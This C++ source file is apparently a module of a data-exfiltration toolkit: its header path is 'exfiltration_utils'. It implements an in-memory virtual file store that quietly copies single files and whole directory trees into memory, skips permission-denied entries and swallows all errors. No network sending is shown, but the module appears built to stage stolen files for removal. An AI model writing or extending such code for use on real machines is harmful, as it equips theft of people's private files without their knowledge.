#include <exfiltration_utils/mem_store.hpp>
#include <filesystem>
#include <fstream>
#include <mutex>

namespace fs = std::filesystem;

namespace mem_store {

static FileMap       g_files;
static std::mutex    g_mtx;

void append(const std::string& vpath, const std::string& text) {
    std::lock_guard lock(g_mtx);
    auto& buf = g_files[vpath];
    buf.insert(buf.end(), text.begin(), text.end());
}

void write_bytes(const std::string& vpath, const uint8_t* data, size_t len) {
    std::lock_guard lock(g_mtx);
    g_files[vpath].assign(data, data + len);
}

void import_file(const std::string& vpath, const fs::path& src) {
    try {
        std::ifstream f(src, std::ios::binary);
        if (!f.is_open()) return;
        Buf buf((std::istreambuf_iterator<char>(f)), {});
        std::lock_guard lock(g_mtx);
        g_files[vpath] = std::move(buf);
    } catch (...) {}
}

void import_tree(const std::string& vprefix, const fs::path& src_root, uintmax_t max_file_bytes) {
    if (!fs::exists(src_root)) return;
    try {
        for (const auto& e : fs::recursive_directory_iterator(src_root,
            fs::directory_options::skip_permission_denied)) {
            if (!e.is_regular_file()) continue;
            if (e.file_size() > max_file_bytes) continue;
            fs::path rel = fs::relative(e.path(), src_root);
            import_file(vprefix + "/" + rel.generic_string(), e.path());
        }
    } catch (...) {}
}

const FileMap& files() { return g_files; }
void clear()           { g_files.clear(); }

}
